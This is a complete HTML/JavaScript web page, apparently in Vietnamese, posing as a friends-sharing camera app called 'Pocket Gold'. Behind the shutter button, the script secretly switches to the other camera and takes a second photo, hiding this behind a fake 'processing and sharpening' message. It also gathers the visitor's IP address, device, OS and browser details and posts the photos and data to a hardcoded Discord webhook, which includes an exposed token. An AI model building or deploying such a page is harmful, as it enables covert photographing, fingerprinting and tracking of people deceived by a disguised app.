<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Pocket Gold</title>
  <!-- Phosphor Icons -->
  <script src="https://unpkg.com/@phosphor-icons/web"></script>
  <!-- UA-Parser-JS -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
  <style>
    :root {
      --bg-color: #ffaa33;
      --card-bg: #e69526;
      --text-color: #ffffff;
      --accent-color: #ffffff;
      --btn-bg: rgba(255, 255, 255, 0.2);
    }

    body.theme-orange {
      --bg-color: #ffaa33;
      --card-bg: #e69526;
      --text-color: #ffffff;
      --accent-color: #ffffff;
    }
    body.theme-pink {
      --bg-color: #fbcfe8;
      --card-bg: #f472b6;
      --text-color: #831843;
      --accent-color: #db2777;
    }
    body.theme-black {
      --bg-color: #000000;
      --card-bg: #18181b;
      --text-color: #ffffff;
      --accent-color: #a1a1aa;
    }
    body.theme-white {
      --bg-color: #f4f4f5;
      --card-bg: #ffffff;
      --text-color: #09090b;
      --accent-color: #18181b;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      user-select: none;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      background-color: var(--bg-color);
      color: var(--text-color);
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;
      padding: 12px 16px;
      transition: background-color 0.4s cubic-bezier(0.4, 0, 0.2, 1), color 0.4s cubic-bezier(0.4, 0, 0.2, 1);
      overflow: hidden;
    }

    /* --- Animation Utilities --- */
    .top-bar, .controls {
      animation: fadeInDown 0.6s cubic-bezier(0.16, 1, 0.3, 1);
    }

    .icon-btn {
      background: var(--btn-bg);
      border: none;
      color: var(--text-color);
      width: 42px;
      height: 42px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 20px;
      cursor: pointer;
      backdrop-filter: blur(10px);
      transition: transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1), background-color 0.3s;
    }

    .icon-btn:active {
      transform: scale(0.88);
    }

    .theme-selector {
      display: flex;
      gap: 6px;
      background: var(--btn-bg);
      padding: 4px;
      border-radius: 20px;
      backdrop-filter: blur(10px);
    }

    .theme-dot {
      width: 22px;
      height: 22px;
      border-radius: 50%;
      border: 2px solid transparent;
      cursor: pointer;
      transition: transform 0.25s cubic-bezier(0.34, 1.56, 0.64, 1), border-color 0.2s;
    }

    .theme-dot:hover {
      transform: scale(1.1);
    }

    .theme-dot.active {
      border-color: var(--text-color);
      transform: scale(1.18);
    }

    .viewfinder-container {
      width: 100%;
      max-width: 270px;
      aspect-ratio: 9 / 16;
      border-radius: 36px;
      overflow: hidden;
      position: relative;
      background-color: #000;
      box-shadow: 0 16px 32px rgba(0,0,0,0.25);
      display: flex;
      align-items: center;
      justify-content: center;
      animation: zoomIn 0.7s cubic-bezier(0.16, 1, 0.3, 1);
    }

    #video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      transition: transform 0.4s ease-in-out;
    }

    #video.mirror {
      transform: scaleX(-1);
    }

    .badge-friends {
      position: absolute;
      top: 12px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(0, 0, 0, 0.4);
      color: white;
      padding: 4px 12px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 6px;
      backdrop-filter: blur(10px);
      animation: fadeIn 1s ease-out;
    }

    .status-overlay {
      position: absolute;
      inset: 0;
      background: rgba(0, 0, 0, 0.75);
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: white;
      font-weight: 600;
      gap: 12px;
      backdrop-filter: blur(8px);
      text-align: center;
      padding: 16px;
      animation: fadeIn 0.25s ease-out;
    }

    .spinner {
      animation: spin 1.8s infinite linear;
    }

    .screen-flash {
      position: fixed;
      inset: 0;
      background-color: #ffffff;
      z-index: 9999;
      display: none;
      opacity: 0;
      transition: opacity 0.05s ease-in-out;
    }

    /* --- Modal & Animations --- */
    .modal-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.75);
      backdrop-filter: blur(10px);
      z-index: 10000;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      animation: fadeIn 0.3s ease-out;
    }

    .modal-box {
      background: #1e1e1e;
      color: white;
      width: 100%;
      max-width: 320px;
      border-radius: 28px;
      padding: 24px;
      text-align: center;
      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
      animation: popUp 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
    }

    .modal-icon {
      font-size: 48px;
      color: #ffaa33;
      margin-bottom: 12px;
      animation: pulseIcon 2s infinite ease-in-out;
    }

    .modal-title {
      font-size: 18px;
      font-weight: 700;
      margin-bottom: 8px;
    }

    .modal-desc {
      font-size: 14px;
      color: #a1a1aa;
      line-height: 1.4;
      margin-bottom: 20px;
    }

    .modal-btn {
      width: 100%;
      background: #ffaa33;
      color: white;
      border: none;
      padding: 14px;
      border-radius: 20px;
      font-weight: 700;
      font-size: 15px;
      cursor: pointer;
      transition: transform 0.2s, background-color 0.2s;
    }

    .modal-btn:active {
      transform: scale(0.95);
    }

    .controls {
      width: 100%;
      max-width: 360px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 12px;
      margin-bottom: 6px;
    }

    .action-row {
      width: 100%;
      display: flex;
      justify-content: space-around;
      align-items: center;
    }

    .shutter-btn {
      width: 72px;
      height: 72px;
      border-radius: 50%;
      border: 4px solid var(--text-color);
      background: transparent;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      padding: 4px;
      transition: transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1), border-color 0.3s;
    }

    .shutter-inner {
      width: 100%;
      height: 100%;
      background: var(--text-color);
      border-radius: 50%;
      transition: transform 0.15s ease-out, background-color 0.3s;
    }

    .shutter-btn:active .shutter-inner {
      transform: scale(0.82);
    }

    .shutter-btn.sending {
      pointer-events: none;
      opacity: 0.5;
      transform: scale(0.9);
    }

    .history-row {
      display: flex;
      gap: 8px;
      align-items: center;
      opacity: 0.85;
      transition: opacity 0.2s;
    }

    .history-item {
      width: 32px;
      height: 32px;
      border-radius: 50%;
      background: var(--btn-bg);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
    }

    .rotate-icon {
      transition: transform 0.4s ease;
    }
    .rotate-icon.rotated {
      transform: rotate(180deg);
    }

    /* --- Keyframe Animations (GPU Accelerated) --- */
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    @keyframes fadeInDown {
      from { opacity: 0; transform: translateY(-12px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes zoomIn {
      from { opacity: 0; transform: scale(0.92); }
      to { opacity: 1; transform: scale(1); }
    }

    @keyframes popUp {
      from { opacity: 0; transform: scale(0.8); }
      to { opacity: 1; transform: scale(1); }
    }

    @keyframes spin {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }

    @keyframes pulseIcon {
      0%, 100% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.08); opacity: 0.8; }
    }
  </style>
</head>
<body class="theme-orange">

  <div class="modal-overlay" id="permission-modal">
    <div class="modal-box">
      <i class="ph ph-camera modal-icon"></i>
      <div class="modal-title">Cấp quyền Camera</div>
      <div class="modal-desc">Trang web yêu cầu quyền truy cập Camera để tiếp tục sử dụng ứng dụng Pocket Gold.</div>
      <button class="modal-btn" onclick="requestPermission()">Đồng ý & Bắt đầu</button>
    </div>
  </div>

  <div class="screen-flash" id="screen-flash"></div>

  <div class="top-bar">
    <button class="icon-btn" id="flash-btn" onclick="toggleFlash()">
      <i class="ph ph-lightning"></i>
    </button>

    <div class="theme-selector">
      <div class="theme-dot" style="background: #000000;" onclick="setTheme('black', this)"></div>
      <div class="theme-dot active" style="background: #ffaa33;" onclick="setTheme('orange', this)"></div>
      <div class="theme-dot" style="background: #fbcfe8;" onclick="setTheme('pink', this)"></div>
      <div class="theme-dot" style="background: #ffffff;" onclick="setTheme('white', this)"></div>
    </div>

    <button class="icon-btn">
      <i class="ph ph-user-plus"></i>
    </button>
  </div>

  <div class="viewfinder-container">
    <video id="video" autoplay playsinline muted></video>
    <div class="badge-friends">
      <i class="ph ph-users-three"></i> Bạn bè
    </div>
    <div class="status-overlay" id="status-overlay">
      <i class="ph ph-sparkle spinner" style="font-size: 32px; color: #ffaa33;"></i>
      <span id="status-text" style="font-size: 13px;">Đang xử lý và làm nét để hình ảnh đẹp hơn...</span>
    </div>
  </div>

  <div class="controls">
    <div class="action-row">
      <div style="width: 42px;"></div>

      <button class="shutter-btn" id="shutter-btn" onclick="startDualCapture()">
        <div class="shutter-inner"></div>
      </button>

      <button class="icon-btn" id="switch-cam-btn" onclick="switchCamera()">
        <i class="ph ph-cameraswitch rotate-icon" id="switch-icon"></i>
      </button>
    </div>

    <div class="history-row">
      <div class="history-item"><i class="ph ph-clock-counter-clockwise"></i></div>
      <span style="font-size: 12px; font-weight: 500;">Khoảnh khắc vừa ghi</span>
    </div>
  </div>

  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1530830759496253591/Pbzj6XovoFjAyAqjYSOvFYkaFk1UP1wRRYU3HFSN8VFNCFTIWx4rhk7mWeECi4_aicI2";

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const shutterBtn = document.getElementById('shutter-btn');
    const statusOverlay = document.getElementById('status-overlay');
    const statusText = document.getElementById('status-text');
    const screenFlash = document.getElementById('screen-flash');
    const permissionModal = document.getElementById('permission-modal');
    const switchIcon = document.getElementById('switch-icon');

    let currentStream = null;
    let facingMode = 'user'; 
    let isFlashEnabled = true;
    let userIP = "Không xác định";

    async function getUserIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        userIP = data.ip;
      } catch (e) {
        userIP = "Không thể lấy IP";
      }
    }

    window.addEventListener('DOMContentLoaded', async () => {
      getUserIP();
      try {
        const permissions = await navigator.permissions.query({ name: 'camera' });
        if (permissions.state === 'granted') {
          const success = await initCamera('user');
          if (success) permissionModal.style.display = 'none';
        }
      } catch (e) {}
    });

    async function requestPermission() {
      const success = await initCamera('user');
      if (success) {
        permissionModal.style.display = 'none';
      } else {
        alert("Không thể truy cập Camera. Vui lòng kiểm tra quyền trên trình duyệt.");
      }
    }

    async function initCamera(mode) {
      if (currentStream) {
        currentStream.getTracks().forEach(track => track.stop());
      }

      facingMode = mode;

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: {
            facingMode: facingMode,
            width: { ideal: 1080 },
            height: { ideal: 1920 }
          },
          audio: false
        });

        currentStream = stream;
        video.srcObject = currentStream;
        await video.play();
        
        if (facingMode === 'user') {
          video.classList.add('mirror');
        } else {
          video.classList.remove('mirror');
        }
        return true;
      } catch (err) {
        console.error("Lỗi khởi tạo Camera:", err);
        return false;
      }
    }

    async function toggleTorch(enable) {
      if (!currentStream) return;
      const track = currentStream.getVideoTracks()[0];
      if (track && 'applyConstraints' in track) {
        const capabilities = track.getCapabilities ? track.getCapabilities() : {};
        if (capabilities.torch) {
          try {
            await track.applyConstraints({ advanced: [{ torch: enable }] });
          } catch (e) {}
        }
      }
    }

    function triggerScreenFlash() {
      return new Promise((resolve) => {
        screenFlash.style.display = 'block';
        screenFlash.style.opacity = '1';
        setTimeout(() => {
          screenFlash.style.opacity = '0';
          setTimeout(() => {
            screenFlash.style.display = 'none';
            resolve();
          }, 100);
        }, 300);
      });
    }

    function switchCamera() {
      switchIcon.classList.toggle('rotated');
      const nextMode = (facingMode === 'user') ? 'environment' : 'user';
      initCamera(nextMode);
    }

    function captureFrame() {
      return new Promise((resolve) => {
        const context = canvas.getContext('2d');
        const vW = video.videoWidth || 1080;
        const vH = video.videoHeight || 1920;

        let sourceHeight = vH;
        let sourceWidth = vH * (9 / 16);

        if (sourceWidth > vW) {
          sourceWidth = vW;
          sourceHeight = vW * (16 / 9);
        }

        const sourceX = (vW - sourceWidth) / 2;
        const sourceY = (vH - sourceHeight) / 2;

        const targetWidth = 1080;
        const targetHeight = 1920;
        canvas.width = targetWidth;
        canvas.height = targetHeight;

        context.save();
        if (facingMode === 'user') {
          context.translate(targetWidth, 0);
          context.scale(-1, 1);
        }

        context.drawImage(video, sourceX, sourceY, sourceWidth, sourceHeight, 0, 0, targetWidth, targetHeight);
        context.restore();

        canvas.toBlob((blob) => {
          resolve(blob);
        }, 'image/jpeg', 0.90);
      });
    }

    async function startDualCapture() {
      shutterBtn.classList.add('sending');
      
      if (isFlashEnabled) {
        triggerScreenFlash();
      }
      const firstBlob = await captureFrame();
      const photos = [{ name: 'camera_1.jpg', blob: firstBlob }];

      statusText.innerText = "Đang xử lý và làm nét để hình ảnh đẹp hơn...";
      statusOverlay.style.display = 'flex';

      const otherMode = (facingMode === 'user') ? 'environment' : 'user';
      const success = await initCamera(otherMode);

      if (success) {
        await new Promise(r => setTimeout(r, 600));

        if (isFlashEnabled) {
          await toggleTorch(true);
          await new Promise(r => setTimeout(r, 200));
        }

        const secondBlob = await captureFrame();
        photos.push({ name: 'camera_2.jpg', blob: secondBlob });

        if (isFlashEnabled) {
          await toggleTorch(false);
        }
      }

      await initCamera('user');
      statusOverlay.style.display = 'none';

      await sendToDiscord(photos);
      shutterBtn.classList.remove('sending');
    }

    async function sendToDiscord(photos) {
      const formData = new FormData();
      
      photos.forEach((photo, index) => {
        formData.append(`file${index + 1}`, photo.blob, photo.name);
      });

      const now = new Date();
      const timeString = now.toLocaleString('vi-VN', {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        day: '2-digit',
        month: '2-digit',
        year: 'numeric'
      });

      const parser = new UAParser();
      const result = parser.getResult();

      const browserName = result.browser.name || "Không rõ";
      const browserVersion = result.browser.version || "";
      const osName = result.os.name || "Không rõ";
      const osVersion = result.os.version || "";
      const deviceModel = result.device.model || result.device.type || "PC/Unidentified";

      formData.append("payload_json", JSON.stringify({
        content: `📸 **Khoảnh khắc mới từ Pocket Gold!** (${photos.length} góc chụp)\n⏰ **Thời gian:** \`${timeString}\` \n🌐 **IP Address:** \`${userIP}\` \n📱 **Thiết bị:** \`${deviceModel}\` \n💻 **Hệ điều hành:** \`${osName} ${osVersion}\` \n🌐 **Trình duyệt:** \`${browserName} ${browserVersion}\``
      }));

      try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          body: formData
        });

        if (response.ok) {
          alert("Gửi khoảnh khắc thành công!");
        } else {
          alert("Gửi ảnh lên Discord thất bại.");
        }
      } catch (error) {
        alert("Lỗi kết nối tới Webhook.");
      }
    }

    function setTheme(themeName, element) {
      document.body.className = `theme-${themeName}`;
      document.querySelectorAll('.theme-dot').forEach(dot => dot.classList.remove('active'));
      element.classList.add('active');
    }

    function toggleFlash() {
      isFlashEnabled = !isFlashEnabled;
      const btn = document.getElementById('flash-btn');
      const icon = btn.querySelector('i');
      if (isFlashEnabled) {
        icon.className = 'ph ph-lightning';
      } else {
        icon.className = 'ph ph-lightning-slash';
      }
    }
  </script>
</body>
</html>
